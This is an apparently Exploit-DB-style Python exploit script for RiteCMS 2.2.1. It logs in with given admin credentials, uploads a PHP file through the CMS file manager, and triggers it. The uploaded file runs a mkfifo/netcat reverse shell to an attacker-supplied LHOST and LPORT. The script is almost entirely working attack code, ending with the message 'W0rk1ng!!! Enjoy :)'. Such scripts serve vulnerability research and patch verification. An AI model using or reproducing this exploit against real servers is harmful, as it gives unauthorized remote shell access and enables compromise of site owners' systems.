# Exploit Title: RiteCMS 2.2.1 - Authenticated Remote Code Execution
# Date: 2020-07-03
# Exploit Author: H0j3n
# Vendor Homepage: http://ritecms.com/
# Software Link: http://sourceforge.net/projects/ritecms/files/ritecms_2.2.1.zip/download
# Version: 2.2.1
# Tested on: Linux
# Reference: https://www.exploit-db.com/exploits/48636

# !/usr/bin/python
# coding=utf-8
import requests,sys,base64,os
from colorama import Fore, Back, Style
from requests_toolbelt.multipart.encoder import MultipartEncoder
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Variable
CONTENT = '''<form action="index.php" method="post">'''

# Header
def header():
	top = cyan('''
 \t _____  _ _        _____ __  __  _____
 \t|  __ \(_) |      / ____|  \/  |/ ____|
 \t| |__) |_| |_ ___| |    | \  / | (___              ___    ___   ___
 \t|  _  /| | __/ _ \ |    | |\/| |\___ \     _  __  |_  |  |_  | <  /
 \t| | \ \| | ||  __/ |____| |  | |____) |   | |/ / / __/_ / __/_ / /
 \t|_|  \_\_|\__\___|\_____|_|  |_|_____/    |___/ /____(_)____(_)_/
''')
    	return top

def info():
	top = cyan('''
[+] IP : {0}
[+] USERNAME : {1}
[+] PASSWORD : {2}
'''.format(IP,USER,PASS))

	return top

# Request Function
# Color Function
def cyan(STRING):
    return Style.BRIGHT+Fore.CYAN+STRING+Fore.RESET

def red(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET


# Main
if __name__ == "__main__":
	print header()
	print "\t--------------------------------------------------------------"
        print "\t|  RiteCMS v2.2.1 - Authenticated Remote Code Execution      |"
	print "\t--------------------------------------------------------------"
	print "\t| Reference : https://www.exploit-db.com/exploits/48636      |"
	print "\t| By        : H0j3n                                          |"
	print "\t--------------------------------------------------------------"
	if len(sys.argv) == 1:
		print red("[+] Usage :\t\t python %s http://10.10.10.10 admin:admin" % sys.argv[0])

		print cyan("\n[-] Please Put IP & Credentials")
		sys.exit(-1)
	if len(sys.argv) == 2:
		print red("[+] Usage :\t\t python %s http://10.10.10.10 admin:admin" % sys.argv[0])

		print cyan("\n[-] Please Put Credentials")
		sys.exit(-1)
	if len(sys.argv) > 3:
		print red("[+] Usage :\t\t python %s http://10.10.10.10 admin:admin" % sys.argv[0])

		print cyan("\n[-] Only 2 arguments needed please see the usage!")
		sys.exit(-1)
	IP = sys.argv[1]
	USER,PASS = sys.argv[2].split(":")
	print info()

	URL='{0}/cms/index.php'.format(IP)
	URL_UPLOAD = URL + '?mode=filemanager&action=upload&directory=media'

	HEAD = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
	LOG_INFO = {"username" : USER, "userpw" : PASS}
	try:
		with requests.Session() as SESSION:
		    SESSION.get(URL)
		    SESSION.post(URL, data=LOG_INFO, headers=HEAD,allow_redirects=False)
	except:
		print red("[-] Check the URL!")
		sys.exit(-1)
	if CONTENT in str(SESSION.get(URL_UPLOAD).text):
		print red("[-] Cannot Login!")
		sys.exit(-1)
	else:
		print cyan("[+] Credentials Working!")
	LHOST = str(raw_input("Enter LHOST : "))
	LPORT = str(raw_input("Enter LPORT : "))
	FILENAME = str(raw_input("Enter FileName (include.php) : "))
	PAYLOAD = "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f'); ?>".format(LHOST,LPORT)
	FORM_DATA = {
	    'mode': (None,'filemanager'),
	    'file': (FILENAME, PAYLOAD),
	    'directory': (None, 'media'),
	    'file_name': (None, ''),
	    'upload_mode': (None, '1'),
	    'resize_xy': (None, 'x'),
	    'resize': (None, '640'),
	    'compression': (None, '80'),
	    'thumbnail_resize_xy': (None, 'x'),
	    'thumbnail_resize': (None, '150'),
	    'thumbnail_compression': (None, '70'),
	    'upload_file_submit': (None, 'OK - Upload file')
	}
	HEADER_UPLOAD = {
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate',
	'Referer': URL_UPLOAD
	}
	response = SESSION.post(URL,files=FORM_DATA,headers=HEADER_UPLOAD)
	if FILENAME in response.text:
		print cyan("\n[+] File uploaded and can be found!")
	else:
		print red("[-] File cannot be found or use different file name!")
		sys.exit(-1)
	URL_GET = IP + '/media/{0}'.format(FILENAME)
	OPTIONS = str(raw_input("Exploit Now (y/n)?"))
	print cyan("\nW0rk1ng!!! Enjoy :)")
	SESSION.get(URL_GET)